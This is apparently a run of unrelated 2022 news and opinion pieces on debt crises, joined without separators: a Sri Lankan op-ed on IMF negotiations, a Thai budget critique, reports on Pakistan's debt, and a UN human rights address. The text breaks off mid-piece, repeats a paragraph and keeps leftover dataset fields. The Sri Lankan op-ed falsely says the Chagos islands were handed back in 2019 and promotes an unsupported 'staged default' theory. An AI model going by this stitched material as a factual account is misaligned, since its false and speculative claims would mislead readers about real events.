Notwithstanding some of these unanticipated debilitating economic cataclysms, some political analysts speculate whether Sri Lanka was duped into a situation of ‘pumped and dumped’ by the Western interests. The World Bank up-graded Sri Lanka to a Lower Middle-Income Country (LMIC) in 1997, and then to the short-lived Upper Middle-Income Country in 2019 thus making it ineligible for lower interest rates for national development thus compelling to borrow from International Capital Markets. This fortuitously coincided with the 2019 Easter Sunday bombing spree which started the rapid downward spiraling of Sri Lanka’s economy.

On top of these, internal mismanagement of our economy also has contributed in no small measure to this predicament. The infamous bond scams, unbridled corruption and nepotism at the highest levels, imprudent decisions of the then monitory board of the Central Bank, and more significantly, holding on to such irrational decisions for a long period thus bleeding our foreign exchange reserves by over US$ 5.5, as reported by one of its members at a recent COPE meeting.

So, it surmises that both external interventions as well as internal economic mismanagement has contributed to the present-day debt crisis leading to ‘Arab Spring’ style protests by segments of the general public fueled by opportunistic politicians and their invisible handlers. It has been transmitted in some academic fora that Sri Lanka’s default seemed to follow a systematic, deliberate, and planned route to haul Sri Lanka into IMF’s and Washington’s clutches. This likelihood had apparently been in the air for some time – at least since the rejection of the Millennium Challenge Corporation (MCC) compact by the Sri Lankan Government in December 2019.

The MCC compact for Sri Lanka was designed to reduce poverty through improved transportation network and providing secure land titles to small holder farmers and other Sri Lankan landholders. The Special Presidential Commission Report which examined the draft MCC Compact has recommended the rejection of the Compact in its current form as it not only imperils Sri Lanka’s economic sovereignty but also undermines the land and human rights of her citizens. We need to be vigilant at this stage at which we are in a desperate situation in meeting day-to-day needs of the people as well as fulfilling debt obligations through their restructuring. There are indications that a number of stealthy moves are already at play to undermine the rights of the people (see recent press releases by Dr. Gunadasa Amarasekera of the Federation of National Organisations).

Some political analysts argue that this ‘staged default’ would enable the IMF to effectively take control of strategic geopolitical positioning by influencing Sri Lanka’s economic policy initiatives compromising its sovereignty. It is also speculated that by doing so, they can stave off the Chinese influence (despite China being a leading member of the IMF) and more significantly, make it difficult for Sri Lanka to source its oil, gas and other energy requirements at discounted rates from sanctions-hit Russia. Ironically, India continues to avail themselves to the discounted oil and gas supplies from Russia despite some resistance from her western partners while helping to meet our energy needs through loans and grants. It is a pity that Sri Lanka is far too late in looking into this possibility of negotiating with Russia directly for supplementing our long-term fossil fuel and other energy needs in exchange for our tea exports.

Sri Lanka is apparently caught between the devil and the deep blue sea for being located in a geostrategic position abundantly endowed with strategically important natural resources. While being at the centre of the Indian Ocean Sea Lanes of Communication (SLOC) with an extensive ocean and land-based mineral resources, including premium grade graphite and rare earth elements, some political analysts are of the view that Sri Lanka suffers from a ‘Paradox of Plenty’ or perhaps, a geostrategic ‘Resource Curse’. This phenomenon often afflicts countries blessed with abundant natural resources, like Sri Lanka. According to the Global Wealth Databook 2020 of the Credit Suisse Research Institute, the total wealth of Sri Lanka is estimated to be USD 351 billion while admitting at the same time that the quality of wealth data used for this estimation to be poor. A more realistic estimate could indeed yield even a higher value and Sri Lanka appears to be far from bankrupt, on that count. Despite all these, we have been having a slower economic development prone to poor governance, corruption and cronyism over successive political regimes since independence. This economic wealth of Sri Lanka may be a key constituent put on offer in attracting creditors to our national-scale real estate assets at this crucial stage of negotiations for debt relief.

The US Ambassador to Sri Lanka and the Maldives, Julie Chung, in a recent press release remarked that Sri Lanka is at the heart of the Indo-Pacific oceanscape, sitting next to some of the world’s busiest shipping lanes through which about half the world’s container ships and two-thirds of the world’s oil shipments pass. According to her, Sri Lanka has the potential to play a pivotal role in the health of world trade. It is not surprising, therefore, the former US Under Secretary for South and Central Asia, Alice G. Well, a few years ago, called Sri Lanka a ‘valuable piece of real estate’ in the Indian Ocean. Still others have termed Sri Lanka ‘an unsinkable aircraft carrier’ in the Indian Ocean – much more strategic than the Chargos Island which was handed back to the people of Mauritius by the British (and hence US occupation ended) in February 2019 after the International Court of Justice in the Hague ruled that the latter’s occupation of Chargos Island was illegal under International Law.

Furthermore, it was none other than the US Secretary Blinken who had recently reported that in today’s world, cyberspace and cyber security are increasingly important and, as part of their vision for the Indo-Pacific, the United States looks to coordinate with partners to ensure an open and secure internet and to implement a framework for responsible behavior in cyberspace.

With a background of this politico-geostrategic wealth, the Sri Lanka Government is up against tough bargaining with the IMF and their designated creditors to raise USD 8 – 12 billion or perhaps even more from the lease or sale of at least some of these valuable ‘real estate’ assets belonging to the public of Sri Lanka which have been grossly mismanaged over decades by successive governments. Dr. Nishan De Mel of Verite Research says, “When the IMF determines that a country’s debt is not sustainable, the country needs to take steps to restore debt sustainability prior to IMF lending”. These steps would undoubtedly feel quite painful in particular to the poorest and most vulnerable sectors of the country.

Prime Minister Wickremasinghe recently stated in the Parliament that SriLankan Airlines, with all its assets would be the first to be privatized to relieve the debt burden. Among the other valuable public assets that are being considered to go under the hammer according to reports on the web are Mattala and Ratmalana airports, Sri Lanka Telecom shares, and the Sri Lanka Insurance Corporation to name a few. Then there are physical assets like Sri Lanka’s marine Exclusive Economic Zone which include the already identified oil and gas deposits, Under-sea Data Cable Routes, the strategic island’s telecom frequencies important for cyber-security. These are a part of this ‘real estate’ package – the cynosure of many powerful global political players backed by leading international financiers – up for negotiations in the name of debt restructuring. Some economists are of the opinion that divesting these strategic public assets resulting from mismanagement, corruption, and ignorance of the potential value of these resources, is tantamount to throwing the baby with the bath water!

The debt restructuring and bridge financing negotiations with the IMF, if successful, may be able to provide us short term debt relief tied with very stringent conditions such as tightening our monitory policy, raising taxes, reduction of government expenditure and wastage, introducing a fuel and utilities pricing formula reflecting the market prices, among others. Although Sri Lanka promised a number of similar adjustments in the during earlier rounds of negotiations with the IMF (in 2009 and 2016), none of them were implemented in full as planned since these would have resulted in high social and political costs.

With such a track record, the conventional IMF debt restructuring formula may not help to overcome our efforts in moving toward bridging the trade deficit. This is primarily because Sri Lanka continues to spend more foreign exchange than its receipt of revenue through the export of goods and services. This indeed has been the root cause of our long-term external debt problem. Economists argue that going to the IMF alone will not fix this problem. According to them, the IMF will simply put a sticking plaster on our arterial wound and send us home. If Sri Lanka continues haemorrhaging foreign exchange with its typical laissez-faire approach, we may have to go back again to the IMF in two years’ time asking for yet more debt relief!.

IMF has just concluded a joint technical session with Sri Lanka to determine a roadmap for restoring macro-economic stability and debt sustainability that will serve as a platform for the negotiations with other creditors/lenders, later. Furthermore, this joint initiative once implemented in compliance with IMF conditions, is expected to increase investors’ confidence and also in securing additional resources from the IMF, the World Bank, Asian Development Bank, and other such agencies.

Amidst all these, there appears to be a silver lining in the dark financial clouds that hovering over Sri Lanka at present where even an adversity of this magnitude could be turned into an excellent medium or long-term investment opportunity. The silver lining in the dark horizon is that the leading international donor agencies are steadily moving towards ‘sustainable financing’ in compliance with the Paris Agreement on Climate Change in the present green economic era.

This shows that a lot of the taxpayers’ money will be used to service public debts, he said.
Worse yet, he added, the government will continue creating public debts, and its recent borrowing will not contribute to the country’s revenue in any way.

According to the budget bill, the Public Debt Management Office will be allocated 192.13 billion baht to cover interest and loan fees, which is three times higher than the portion of the capital it has to pay back this fiscal year.

This shows that a lot of the taxpayers’ money will be used to service public debts, he said. Worse yet, he added, the government will continue creating public debts, and its recent borrowing will not contribute to the country’s revenue in any way.

The third issue, he pointed out, was that the proposed spendings by government agencies were based on daydreams about the economic outlook. While the panel sees a negative outlook, government agencies think otherwise.

“It’s like we’re living in different countries,” he said.

Paopoom added that the 2023 budget bill was based on projected GDP growth of 3.7 per cent. However, he said, these figures were calculated several months ago before many negative factors hit the country, such as rising inflation and the US Federal Reserve hiking policy rate.

Fourthly, he said, the Revenue Department has been missing its revenue target every month this year. So far, he said, it has missed the target by 26.5 billion baht.

What is worse, he added, is that the department will harm the investment atmosphere by going ahead with its plan to collect taxes from the trading of shares and digital assets, and not collect any inheritance tax.

The fifth point Paopoom said was the fact that state banks had failed to help small and medium enterprises as they should have done. Instead, he said, they were more focused on making profits and lowering non-performing loans.

The sixth, and most worrying sign, Paopoom said, was that this budget bill will create a deficit that will near the ceiling due to the government’s inflated figures of possible revenue and GDP. He said the situation would worsen if the Finance Ministry is forced to raise the policy rate due to external negative factors.",Debt Crisis,2022-06-13 12:13:28

Two days after the budget was formally presented in the National Assembly, the PML-N and the PTI continued to butt heads over each other's economic performance and the state of Pakistan's external debt, reported Dawn.

Earlier today, Information Minister Marriyum Aurangzeb took to Twitter to share a video clip of a news package featuring former finance minister Shaukat Tarin.

The clip was of a press conference Tarin held yesterday, in which he had said, ""They (government) say ever since was formed they (PTI) have raised the debt by 80 per cent. It did not increase by 80 per cent in the (four) years (of the PTI rule). It grew by 76 per cent.""

Referring to those remarks, Aurangzeb said, ""At last, Shaukat Tarin has admitted that took out loans worth Rs 20 thousand billion during his four-year tenure, which is 76 per cent of the loans taken out in Pakistan's history."" She added that more such ""admissions"" would follow, reported Dawn.

Finance Minister Miftah Ismail then said, ""Total public debt under PTI went from Rs 24,953 billion to Rs 44,366 billion, an increase of 78 pc. And total debt plus liabilities went from Rs 29,879 billion to Rs 53,544 billion, an increase of 79 pc. The PTI has added 79 pc in 3.75 years of all debt + liabilities added in the previous 71 years.""

PTI's Fawad Chaudhry, meanwhile, said their government took out loans of USD 52 billion of which USD 38 billion was to pay back the loans taken out by the previous governments. ""If you do not like the agreements made with the Monetary Fund (IMF), then why does the poor government go to the board?"" he asked.

Responding to Aurangzeb, Chaudhry said she was bound to make such uninformed remarks when she spent all her time ""playing Candy Crush"" -- a mobile phone game. Yesterday, he claimed the government was not serious because Aurangzeb was ""playing video games"" during the post-budget press conference, reported Dawn.

Meanwhile, Tarin said that the PTI's economic performance over the last two years was the best in 30 years. ""Stop deceiving people, they know the truth. Your performance is evident in the last eight weeks, pathetic,"" he said.

In a later tweet, Tarin claimed that while PTI's debt increased by 76 per cent ""despite Covid when tax burdens increased the world over"", the PML-N increased debt by 79 per cent during their time.

The economic survey of Pakistan revealed that total external debt had touched USD 88.8 billion (Rs 16.29 trillion) by the end of March 2022, having increased by around USD 2.3 billion over the first nine months of the outgoing fiscal year.

Meanwhile, Prime Minister said that the budget represented ""significant improvement"" in several ways, reported Dawn.

""It has provided more educational opportunities for our youth, particularly from Balochistan and targeted subsidies for financially weaker people. More importantly, it has taxed non-productive assets of the rich,"" he said.

PTI Chairman Imran Khan, on the other hand, was still not convinced. ""Given the special needs of tribal districts, my government had increased their funding by three times to Rs 131 billion. The imported government has budgeted only Rs 110 billion, reduced development funding, zero allocation for displaced persons and zero increase in the current budget. Shows incompetence and ill-intent of the government of crooks,"" he said.

Dr. Bery was addressing a Panel Discussion on ‘Sri Lanka’s economic crisis and what Pakistan needs to learn’ organised here by the Institute of Strategic Studies (ISS).

Dr. Bery said that India is currently leading the way to help Sri Lanka to get out of the existing situation.

Rehana Thowfeeq from Advocata Institute, Sri Lanka, said that both issues, the impending structural issues, and decisions that were taken during the COVID-19 pandemic, have impacted the Sri Lankan economy.

She added that the series of the bad economic decisions based on populist moves led to the path of abandoning fiscal consolidation in the country. This ultimately led to the current crisis the economy is crippling with, she concluded.

Sharukh Wani from International Growth Centre, Blavatnik School of Government, University of Oxford observed that bad policy decisions are leading the Pakistani economy on a downward spiral. This is partly due to a lack of political ownership arising out of political instability in the country. On the policy option available, he emphasized that the government needs to own up to the problem and take tough decisions in order to stabilise the economy. Also, the upcoming macroeconomic structural issues need to be addressed to avert the emerging crisis beforehand.

Imran Sardar, Research Analyst, Institute of Regional Studies, Islamabad, stressed that the global geopolitical dynamics and Pakistan’s dependence on major powers have hugely impacted its economy. Pakistan’s current geo-economic policy needs a careful balancing approach and a deep understanding of the Chinese role in its economy also needs to be focused on.

Khalid Mahmood, Chairperson, BoG, ISS, said that one should live within one’s means as going beyond the limits and investing in unproductive solutions could lead to a debt trap-like situation. Therefore, the right decisions at the right time are the need of the hour if Pakistan is to avoid Sri Lanka-like situation, he warned.

Earlier, in his welcome remarks, Aizaz Ahmad Chaudhry, Director-General, ISS, said that what is happening in Sri Lanka is a sad situation but the good thing coming out is that the Sri Lankan government is taking up the challenge and not shying away from the problem which is a step in the right direction.",Debt Crisis,2022-05-19 07:00:00

A report on Friday showed a surge in inflation in the United States, which rattled markets, as investors worried that the Federal Reserve may have to raise interest rates higher and faster than expected to rein in rising prices, a move that could hit the U.S. economy.

Pakistan now faces daunting challenges in dealing with the economic crisis to meet its balance of payments needs and avoid economic default.

The budget deficit in the outgoing year 2021-22 is expected to be around Rs5,200 billion. Circular debt in the power sector is going to be Rs2,500 billion. Trade deficit has increased by 58% to about $45 billion whereas current account deficit would be around $16 billion.

Consequent to high imports and pressure on exchange rate, the forex reserves declined to $9.7 billion, which is hardly sufficient to meet 1.5 months of imports.

Pak rupee has been falling against US dollar continuously and has declined to Rs202 from Rs180 a dollar. Consequently, inflation rate has increased to 14% despite a rise in the policy interest rate to 13.75%.

Gross public debt increased to Rs44,365 billion or 75% of GDP. Consequently, the debt servicing would be around Rs3,900 billion during the next financial year. Total external debt and liabilities increased to $128 billion by March 2022.

Government is in a difficult situation since it will have to pay $21 billion to the international creditors for external debt servicing during the next financial year.

Country is facing a serious economic crisis in an environment of political turmoil and uncertainty.

If timely policy actions and corrective policy measures are not implemented, country can face a default and a crisis like Sri Lanka, which will have far-reaching implications for inflation, growth and employment and will affect the poor and the vulnerable segments of population.

Pakistan has no choice but to accept tough IMF conditions in order to restore the IMF programme to avert an economic default.

We all know that the country has already undertaken 22 IMF programmes in past and IMF policies and programmes have not proved to be a panacea to address the country’s economic woes.

It is noteworthy that most of our economic problems are spanning over the last 15 years as the country has been maintaining high budget and high current account.

Unfortunately, these deficits have been financed through borrowing from abroad, which has increased the debt burden on the country.

The nation with nuclear capability now faces a dilemma owing to inappropriate macroeconomic expansionary policies, higher government expenditures, losses of state-owned enterprises, untargeted subsidies, fixed exchange rate policy until 2017, and import-driven expansionary fiscal policy of the outgoing government in 2022 that led to a high current account deficit and put pressure on the exchange rate resulting in a persistently high double-digit inflation rate.

Though the new government has taken measures for removal of subsidies on petroleum products and put restriction on imported non-essential items, the country needs an immediate political consensus on a charter of the economy backed by the establishment to avoid an economic meltdown. Difficult decisions are needed over the next few months to stop the hemorrhage owing to overspending and over-importing.

First of all, Pakistan needs to restart IMF funding by implementing economic reforms in order to restore its credibility in the markets, along with continuation of CPEC financing.

Reforms to reduce high trade and current account deficits would require major cutbacks in expenditures and imports, but without adversely impacting the cost of living of low-income families whose lives have become miserable due to persistently high inflation over the last few years.

The government’s economic reform programme must include reduction in fiscal and current account deficits by half over the next one year by reducing fiscal deficit by Rs2,000 billion and non-essential imports by $10 billion consumed by the rich elite.

Import reduction must be achieved in the first three months to avoid an economic collapse and stop free fall of Pak rupee against US dollar.

This is essential for the belt-tightening of upper-income households, to send a signal that poor are not made victim of the economic mismanagement caused by the previous government. The economic reform programme must encompass the following measures:

First, through tax and credit policies, we must restrict growth of highly import-dependent industries (cars, luxury goods, electronics, etc) producing for the domestic market.

Second, declaring all exporting industries as tax-free manufacturing units, and ensuring to provide them all utilities at regionally competitive prices and subsidised credit. Bangladesh has increased its exports to $45 billion through this way.

Third, providing Rs800 billion of targeted subsidies as cash grant to 30 million poor and vulnerable families through BISP registry system to compensate for the rise in electricity, petroleum and food prices.

Once targeted subsidies are in place, market prices of these goods can be increased through higher tax rates and import duties, which would provide revenue for offering targeted subsidies to the poor and vulnerable groups.

Fourth, the non-development government expenditures must be reduced by Rs1,000 billion through cutting waste in civil and military institutions, cutting development expenditure and reducing throw-forward except for dams and water management, privatising the loss-making SOEs and reducing untargeted subsidies.

Fifth, there is a need to impose a tax to raise Rs1,000 billion to reduce public debt. This tax can be imposed on: (i) all assets (vehicles, agriculture land, urban real estate, and PSX shares) of individuals who own assets of more than Rs5 crore; and (ii) capital gains on real estate and shares, and profits of large companies. This is a sacrifice that should be given by the rich elite to save the country.

Sixth, reduce lending and deposit interest rates by 5% by reducing discount rate to 8%. This will reduce the cost of borrowing for the firms and accelerate the GDP growth and employment.

Low-income pensioners and widows can be given protection of income through higher rates on national savings instruments. The target should be to save around Rs700 billion annually on interest expenses on domestic public debt.

Finally, the country should impose a one-year embargo on all imported cars, cellphones, non-essential food and all manufactured home-use goods with the objective to reduce imports by $8-10 billion next year, which would reduce current account deficit, strengthen domestic currency against US dollar and accelerate growth and employment opportunities.

It is an honour to address you today, in what continue to be challenging times for the promotion and protection of human rights.

Since we last gathered, the war in Ukraine continues to destroy the lives of many, causing havoc and destruction. The horrors inflicted on the civilian population will leave their indelible mark, including on generations to come.

Its social, economic and political ramifications ripple across the region and globally, with no end in sight.

A global food, fuel and finance crisis now risks plunging millions into food insecurity and poverty. 1.2 billion people live in countries that are severely exposed and vulnerable to all three dimensions of finance, food, and energy, simultaneously.

The World Food Programme estimates that the number of severely food insecure people is expected to grow from 276 million at the start of 2022 to 323 million in the course of the year.

According to the UN Global Crisis and Response Group the combination of higher food and energy prices, growing inflation, export restrictions, and tightening financial conditions will be devastating, in particular on the most vulnerable.

Inequalities between and within countries are skyrocketing, threatening COVID-19 recoveries, undermining progress in the implementation of the SDGs and slowing down climate action.

In the face of these multiple and intersecting challenges and rising global tensions, many people I meet are questioning not only their own futures, but the future of their societies, and of our globe.

I understand and share their concerns.

It is tempting to slip back into emergency mode and focus on putting out the first fires we see.

Yes, stronger, immediate action is needed to address the worst impacts and to limit human suffering.

But this is not sufficient.

We need to invest in addressing the conditions that provoke these crises.

I urge us, at precisely this moment of grave and profound threat, to pursue the path we had committed to in the wake of the COVID-19 pandemic.

We gathered in multilateral fora, in high level debates and donor meetings and spoke of global solutions and of putting people at the centre of our efforts. We committed ourselves to learning the lessons of the pandemic, and to recover better.

Eager to avoid the devastating consequences of the austerity that followed the 2008 financial crisis, the international community agreed to change course: building – together - transformative societies and towards greener economies that will be more resilient to crises.

We are now facing a vital test of that commitment. And we need to meet it.

The 2030 Agenda and the Paris Agreement must remain our blueprint for this ambition.

Within the eight years that remain we must take bold and urgent action to generate the transformative change that is needed to meet the Sustainable Development Goals.

That recognition has inspired Our Common Agenda and the Call to Action for human rights, in which the Secretary-General calls for a more networked and inclusive multilateralism, with actors joining forces to take on the global and interconnected challenges facing humanity.

In that spirit, and by drawing on the work of my office, allow me to highlight four areas of intervention that I hope can give us some direction in the face of the current crises.

First, we need to tackle inequality and discrimination.

We live in a world of staggering inequality, with one study estimating that global inequalities are about as great today as they were in the early 20th century.

The World Bank had projected 198 million more people living in extreme poverty during 2022 due to COVID-19. Global food prices alone are now estimated to add a further 65 million more people to that total.

While people across all income groups experienced losses during the pandemic, the poorest 20 percent experienced the steepest decline in incomes. And the poorest 40 percent haven’t started to recover their income losses.

And as the climate crisis continues to worsen for us all, it is again the poorest and most vulnerable who are bearing the harshest brunt.

People’s capacity to withstand yet another crisis is shrinking even further.

So we must further commit to redressing inequalities and discrimination. Today we know that greater equality can be an even more powerful engine than growth in reducing extreme poverty - a key goal of the 2030 Agenda.

My Office continues to expand its work to tackle inequality and discrimination, including by contributing to efforts to develop metrics beyond GDP, covering a range of inequalities, to measure progress. In a number of countries in Europe and the Americas, we have provided guidance and delivered training on anti-discrimination, minority and indigenous peoples rights to national authorities and UN entities.

We supported several countries to implement the Convention on the Rights of Persons with Disabilities including Georgia, Malawi, Mozambique and North Macedonia.

Real progress also depends on investigating and seeking justice for victims of discrimination. OHCHR has provided technical advice to enhance investigation protocols for gender-related killings of women, for instance in Chile and Honduras.

My Office has also contributed to the development of UN system-wide operational guidance to United Nations country level work on Leave No One Behind.

In Guinea-Bissau, together with the UN country team and the Government, we supported country-wide consultations, including with most disadvantaged groups, to ensure a human rights based approach, in the country’s first voluntary national review. My Office also supported the government of Serbia to mainstream the pledge to Leave No One Behind in Government policy and law making. The development of an Action Plan for the National Anti-Discrimination Strategy will draw on these efforts.

This brings me to the issue of disaggregated data. We cannot fix what we cannot see. Disaggregated data – critical to fighting inequalities, particularly in the current context - remains largely unavailable, especially regarding multiple and intersecting forms of discrimination.

There is an urgent need to strengthen statistical capacities of countries, including through increased international support. To that end, together with UNDP, my Office launched a joint project to strengthen UN country teams’ and NHRIs’ capacities on SDGs and prevention, including on disaggregated indicators and data on marginalized and vulnerable groups.

Second, national budgets should integrate human rights

If national budgets integrate States’ human rights obligations and are designed and implemented through a human rights-based approach, they can be a powerful lever for SDG progress. If they allocate sufficient resources to cover at least minimum essential levels of economic and social rights, we can deliver better development results.

Increasing national spending in social sectors, with a focus on accessibility, affordability, and quality of services and non-discrimination, particularly in the current context, will strengthen countries’ capacity to withstand shocks.

In this regard, my office is assisting countries to analyse their budgets, mobilise resources and create more fiscal space through a human rights lens.

For instance, through the UN Assistance Mission in Somalia, we helped assess the human rights compliance of a Government social protection cash transfer scheme. By drawing on UPR recommendations and inclusive consultations, proposals were made on mobilising domestic resources and through debt relief, with a view to leave no one behind.

Distinguished President,

The COVID-19 pandemic illustrated the stabilising force of social protection.

States adopted and financed innovative measures during the pandemic: they expanded coverage to informal workers, undocumented migrants and specific vulnerable populations; some integrated gender-responsive elements; some increased social protection benefits; and enacted laws to support employees and the self-employed.

These measures helped mitigate the socio-economic consequences of the pandemic.

And yet, today, over 4 billion people – more than half of the world`s population – still do not have access to any social protection. The UN Global Crisis and Response Group notes that developing countries miss $1.2 trillion per year to fill the social protection gap. The Group warns that unless social protection systems are adequately extended, people will be forced to make choices with severe impact on health, education and livelihoods.

Investing in social protection systems pays off in the short-term – by mitigating crisis – and in the long term, by nurturing human development and economic productivity, and fostering resilient institutions.

My Office has also supported States in their efforts in this regard.

In Timor Leste, together with the Government and ILO, we are exploring strategies to extend social protection coverage to women informal workers who are disproportionately affected by poverty.

My office also engaged with the South Africa Development Community in preparing its Model Law on Public Finance Management. We provided guidance on human rights-based social sector investment, and made recommendations on domestic resource mobilization options, including progressive taxation. This law can, we hope, serve as a benchmark for national Parliaments to reinforce their domestic legal framework on public financial management.

Countries have different capacities to invest in social protection. Therefore, more than ever we see the need for universal, comprehensive, and sustainable social protection systems as called for by human rights and by ILO recommendation 202.

Real progress can only occur if bold initiatives such as the proposed Global Fund for Social Protection can get off the ground.

Third, greater international cooperation and solidarity – including for debt relief - is needed now.

Without a significant boost in financial resources, we will not be able to achieve the SDGs.

The financing gap to achieve the SDGs has widened by over 70 per cent to an annual amount of $4.3 trillion.

This gap requires countries to mobilise public and private resources both domestically and internationally. Yet, spiralling debt and uncertain prospects of economic outlook – which will be further exacerbated in the current context - are holding many developing countries back. In 2022, it is estimated that these countries will require $311 billion to service public external debt, amounting to 13.6 per cent of government revenues.

Strengthening fiscal systems can certainly help raise additional domestic resources in all countries.

But for many countries at various levels of development, support is crucial.

Against this backdrop, I urge countries to remember our commitment to build forward better. This is the time to redouble efforts towards the O.7 per cent ODA target, armed with the knowledge that social spending today yields better societal outcomes tomorrow.

Lurking behind these finance concerns is a looming debt crisis, as the Secretary-General has warned .

So early and coordinated action of all, in particular international financial institutions, but also public and private creditors, is urgently needed.

International financing mechanisms to support strong national fiscal responses need to be fully funded and operationalised to meet the SDGs.

We also need to improve regulation of private sector actors such as ratings agencies. The UN Guiding Principles on business and human rights can serve as a robust guide for better aligning private investment with human rights and development objectives.

Finally, in order to shift towards a system with coordinated, comprehensive and sustainable debt solutions we need a reform of the international financial architecture.

And the role of international financial institutions is critical in supporting indebted countries. International human rights law provides the framework for this support, including how to mitigate retrogression in the fulfilment of rights. This involves ensuring that measures adopted do not result in discriminatory outcomes, in particular for the most marginalised.

And finally – civic space. I wish to conclude on what I think is the most crucial – and valuable – element of building resilience in times of crisis.

These are times for greater – not less - transparency and broader space for civic engagement and participation if we are serious about our commitments to build transformative and greener societies. A vibrant civic space is a lever of a stable, secure society. Yet, we continue documenting attacks against defenders and journalists, off-line and online, worldwide.

We cannot separate progress on economic goals, such as reducing poverty, from the rights of those who are the intended beneficiaries of those developments – including the right of those people to be heard.

I know and have seen that a life in dignity means securing the rights to work, to housing, to food, to water and sanitation.

I have also experienced, first-hand, that these rights can only be protected and fulfilled if people have the space to express their views and to demand the change they wish to see.

Together, these rights are the life blood of a vibrant, just and peaceful society.

By contrast, arresting those who protest peacefully, shutting down independent media, detaining lawyers - these are measures that not only violate rights, they eat away at the foundations of our prosperity and security.

The lessons here are clear, and are visible in the most powerful countries in the world, West and East. When we adopt laws that discriminate on the basis of religion, take shortcuts by profiling groups, give broad license to law enforcement without sufficient independent oversight, we damage not only our credibility but our stability. Terrorism is a scourge that unites us all in horror and commitment to combat it. But there can only be success in countering terrorism if, in doing so, we fully live up to the values we are defending.

I am proud to lead United Nations efforts, under the Secretary-General’s Call to Action, to make civil society participation more inclusive and safer. My Office led efforts to develop the UN system guidance note on civic space, and has supported human rights defenders networks in the Pacific and the Americas as well as the Women Human Rights Defenders networks in Ethiopia, Tanzania and elsewhere in East Africa.

Distinguished President,

Excellencies,

State responses to our growing challenges make or break the lived reality of human beings everywhere. Free and fair elections are critical, but people will measure the success of democracy by the extent to which they feel tangible differences in their lives.

Human rights reaffirm what economists are telling us – that progress on human rights and development make economic sense and deliver better outcomes in the medium and longer term.

Human rights are the tool to respond to political pressures for a quick fix.

And they are the tools that bring people together.

This is not a pretty path: open societies can be chaotic, with their flaws visible to all, and their results not immediate.

But it is a steady one. I hope we can unite on this path.

Distinguished President,

Excellencies,

Since I last updated you, I have undertaken two country visits – first to Afghanistan and most recently China. I will update you separately on Afghanistan on Wednesday.

During my visit to China I engaged in dialogue with the most senior leaders and officials at national level, and met with key representatives at regional level in Guangdong and Xinjiang.

We had discussions on specific human rights concerns, including human rights violations in the context of China’s policies for countering terrorism and safeguarding national security, protection of the rights of ethnic and religious minorities, judicial and legal protection including for women, human rights in the digital space, and business and human rights. I also raised concerns regarding the human rights situation of the Uyghur and other predominantly Muslim minorities in Xinjiang, including broad arbitrary detention and patterns of abuse, both in the VETC system and in other detention facilities. My Office’s assessment of the human rights situation in Xinjiang is being updated. It will be shared with the Government for factual comments before publication.

In addition, I raised human rights concerns in the Tibet and Hong Kong regions and discussed possible follow up actions with my Office.

I am also grateful for the informative and frank exchanges my team and I had with survivors and their family members and with civil society representatives, including outside of the country, whose information and perspectives are vital.

I have always emphasized the importance of dialogue in my engagement with all Member States, even on the most difficult issues. Going forward, we have agreed with the Government of China to hold an annual senior meeting on human rights and to continue exchanges on the abovementioned topics and specific human rights issues of concern. We are now elaborating concrete steps to put the agreements into action.

I now wish to update you on a few critical situations that call for urgent action. I will not touch on those situations that are the subject of separate discussions during this session: being, alongside Afghanistan, Iran, Myanmar, Nicaragua, Sudan, Syria, Ukraine and Venezuela.

I remain concerned about persistent impunity for violations of human rights.

In Haiti, impunity for corruption and human rights violations and abuses is a structural and longstanding challenge and one of the root causes of violence. The rapid deterioration of the human rights situation particularly in the metropolitan area of Port-au-Prince, results from violent clashes between heavy armed gangs rapidly expanding their control over the capital. Killings, kidnappings, sexual violence, including against children, are used to instil fear and displace the local population. Urgent, comprehensive action by the international community to tackle sexual violence and strengthen accountability mechanisms is necessary.

On her recent trip to South Sudan, while acknowledging some progress in the area of transitional justice, my Assistant Secretary-General for Human Rights called on the authorities to fight impunity, hold perpetrators of human rights violations to account and encouraged compensation to victims. The institutional vacuum in Abyei, impeding justice and accountability for violations, including those linked with killings of civilians in the context of intercommunal violence, continues to be worrying.

In Kazakhstan, I welcome investigations related to events that took place earlier this year, and call for ensuring that they are conducted thoroughly and independently, ensuring accountability.

I call on the Israeli authorities to open a criminal investigation into the killing of journalist Shireen Abu Akleh, to promptly make conclusions and findings public, and to hold perpetrators accountable. Under international human rights law, Israel should investigate and ensure appropriate accountability for every case of death and serious injury inflicted by Israeli Forces. The prevailing climate of impunity is fuelling further violations and violence - the now chronically high levels of killings and injuries of Palestinians, including children, by Israeli Forces in the occupied Palestinian territory have continued in the first six months of 2022.

I continue to have concerns with threats to the rule of law in several countries.

In Türkiye, the trials and prison sentences of activists and political opponents such as Osman Kavala, his seven co-defendants and Canan Kaftancıoğlu are of concern, as they appear to be targeted for their dissenting views. In the run-up to the elections, I urge special attention be paid to fundamental freedoms, political participation, due process, gender equality and addressing the rise in violence and anti-refugee sentiment.

I am worried about plans in the United Kingdom to replace one of the most important pieces of its human rights legislation – the Human Rights Act – with more limited legislation. I have concerns that repeal of key elements of the Human Rights Act would risk undermining access to justice and the right to effective remedies, introduce legal uncertainty, and increase costs.

In Guatemala, we observe, over a sustained period of time, a pattern of attacks against justice officials for their work involving emblematic cases of serious human rights violations, corruption and impunity. The state must guarantee the independence of judicial institutions and protection of justice officials.

In Mexico, I encourage the strengthening of civil institutions to establish an orderly plan to withdraw the military from public security tasks.

In Singapore, I am also concerned about the recent executions of two persons for drug related offences. More than 60 defendants are estimated to be on death row. With over 50 people facing this irreversible penalty for drug related offences, the vast majority of whom have exhausted appeals, I urge the Government to impose a moratorium on the death penalty, especially for non-violent, drug related crimes.

I commend the announcement of steps taken to abolish the death penalty in its entirety in the Central African Republic and to remove the mandatory death penalty in Malaysia, as well as the pledge made by the President of Zambia to abolish the death penalty. I urge all States that have not abolished it yet to join the global trend towards universal abolition, and to fully respect the right to life.

While recognising a State’s duty to address increasing criminality and ensure security I urge authorities to ensure measures are implemented in line with international human rights law.

For example, in El Salvador, the measures adopted under the state of emergency to fight gang violence together with subsequent criminal law amendments increase the risk of arbitrary detention and torture of detainees. More than 38,000 people have been arrested in the context of the state of emergency, raising concerns about respect for due process guarantees. Of particular concern are the at least 21 deaths in custody reported by official sources.

In Colombia, I welcome the peaceful and democratic character of the first round of the presidential elections, and trust a similar spirit will govern the run off, guaranteeing political rights. I urge effective implementation of the peace agreement, particularly the dismantling of groups responsible for the increase in violence. I welcome the significant transitional justice developments, including acknowledgement by military officials of responsibility for killings of civilians falsely presented as killed in combat. I call on the State to ensure independent transitional justice mechanisms and guarantee the protection of participating witnesses and victims.

